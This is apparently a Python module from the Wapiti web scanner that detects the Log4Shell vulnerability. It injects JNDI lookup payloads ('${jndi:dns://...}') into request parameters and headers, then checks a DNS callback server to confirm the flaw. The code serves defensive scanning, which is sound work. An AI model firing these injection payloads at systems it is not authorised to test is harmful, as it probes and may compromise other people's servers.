import copy
import itertools
import socket
import uuid
from os.path import join as path_join
from typing import Dict, Iterable, List, Tuple

import dns.resolver
from httpx import RequestError
from wapitiCore.attack.attack import Attack
from wapitiCore.definitions.log4shell import NAME
from wapitiCore.language.vulnerability import _
from wapitiCore.main.log import log_red, logging
from wapitiCore.net.web import Request


class ModuleLog4Shell(Attack):
    """
    Detect the Log4Shell vulnerability (CVE-2021-44228)
    """

    name = "log4shell"
    do_get = True
    do_post = True

    HEADERS_FILE = "log4shell_headers.txt"

    def __init__(self, crawler, persister, attack_options, stop_event):
        Attack.__init__(self, crawler, persister, attack_options, stop_event)
        if not self._is_valid_dns(attack_options.get("dns_endpoint")):
            self.finished = True
        else:
            self._dns_host = socket.gethostbyname(self.dns_endpoint)

    async def must_attack(self, request: Request):
        if self.finished is True:
            return False
        return True

    async def read_headers(self) -> List[str]:
        with open(path_join(self.DATA_DIR, self.HEADERS_FILE), encoding='utf-8') as headers_file:
            return headers_file.read().strip().split("\n")

    async def attack(self, request: Request):
        headers = await self.read_headers()

        batch_malicious_headers, headers_uuid_record = self._get_malicious_headers(headers)

        for malicious_headers in batch_malicious_headers:
            modified_request = Request(request.url)

            try:
                await self.crawler.async_send(modified_request, malicious_headers, follow_redirects=True)
            except RequestError:
                self.network_errors += 1
                continue
            await self._verify_headers_vulnerability(modified_request, malicious_headers, headers_uuid_record)

        injected_get_and_post_requests: Iterable[Tuple[Request, str, uuid.UUID]] = itertools.chain(
            self._inject_payload(request, request.get_params),
            self._inject_payload(request, request.post_params)
        )

        for malicious_request, param_name, param_uuid in injected_get_and_post_requests:
            try:
                await self.crawler.async_send(malicious_request, follow_redirects=True)
            except RequestError:
                self.network_errors += 1
                continue
            await self._verify_param_vulnerability(malicious_request, param_uuid, param_name)

    async def _verify_param_vulnerability(self, request: Request, param_uuid: uuid.UUID, param_name: str):
        if not await self._verify_dns(str(param_uuid)):
            return
        element_type = "query parameter" if request.method == "GET" else "body parameter"

        await self.add_vuln_critical(
            category=NAME,
            request=request,
            info=_("URL {0} seems vulnerable to Log4Shell attack by using the {1} {2}") \
                .format(request.url, element_type, param_name),
            parameter=f"{param_name}"
        )

        log_red("---")
        log_red(
            _("URL {0} seems vulnerable to Log4Shell attack by using the {1} {2}"),
            request.url, element_type, param_name
        )
        log_red(request.http_repr())
        log_red("---")

    async def _verify_headers_vulnerability(
        self,
        modified_request: Request,
        malicious_headers: dict,
        headers_uuid_record: dict
    ):
        for header, payload in malicious_headers.items():
            header_uuid = headers_uuid_record.get(header)

            if await self._verify_dns(str(header_uuid)) is True:
                await self.add_vuln_critical(
                    category=NAME,
                    request=modified_request,
                    info=_("URL {0} seems vulnerable to Log4Shell attack by using the {1} {2}") \
                        .format(modified_request.url, "header", header),
                    parameter=f"{header}: {payload}"
                )

                log_red("---")
                log_red(
                    _("URL {0} seems vulnerable to Log4Shell attack by using the {1} {2}"),
                    modified_request.url, "header", header
                )
                log_red(modified_request.http_repr())
                log_red("---")

    async def _verify_dns(self, header_uuid: str) -> bool:
        resolver = dns.resolver.Resolver(configure=False)
        resolver.nameservers = [self._dns_host]
        answer = resolver.resolve(header_uuid + ".c", "TXT")

        if answer[0].strings[0].decode("utf-8") == "true":
            return True
        return False

    def _get_malicious_headers(self, headers: List[str]) -> Tuple[Dict, Dict]:
        batch_malicious_headers: List[Dict[str, str]] = []
        headers_uuid_record = {}
        batch_size = 10

        # Creates batch of batch_size elements
        headers_batch = [headers[i:i + batch_size] for i in range(0, len(headers), batch_size)]

        # Creates a UUID for each header
        for header_batch in headers_batch:
            malicious_header = {}

            for header in header_batch:
                header_uuid = uuid.uuid4()
                malicious_header[header] = self._generate_payload(header_uuid)
                headers_uuid_record[header] = header_uuid
            batch_malicious_headers.append(malicious_header)

        return batch_malicious_headers, headers_uuid_record

    def _inject_payload(
        self,
        original_request: Request,
        params: List[Tuple[str, str]],
    ) -> Tuple[Request, str, uuid.UUID]:
        for idx in range(0, len(params)):
            malicious_params = copy.deepcopy(params)

            param_uuid = uuid.uuid4()
            param_name = malicious_params[idx][0]

            malicious_params[idx][1] = self._generate_payload(param_uuid)

            malicious_request = Request(
                path=original_request.url,
                method=original_request.method,
                post_params=malicious_params if original_request.method == "POST" else original_request.post_params,
                get_params=malicious_params if original_request.method == "GET" else original_request.get_params,
                referer=original_request.referer,
                link_depth=original_request.link_depth
            )
            yield malicious_request, param_name, param_uuid

    def _generate_payload(self, unique_id: uuid.UUID) -> str:
        # The payload needs to be split because we are using the formatted string syntax to modify it dynamically,
        # but it is also using this syntax for the exploit.
        return "${jndi:dns://" + f"{self.dns_endpoint}/{unique_id}" + ".l}"

    @staticmethod
    def _is_valid_dns(dns_endpoint: str) -> str:
        if dns_endpoint is None:
            return False
        try:
            socket.gethostbyname(dns_endpoint)
        except OSError:
            logging.error(_("Error: {} is not a valid domain name").format(dns_endpoint))
            return False
        return True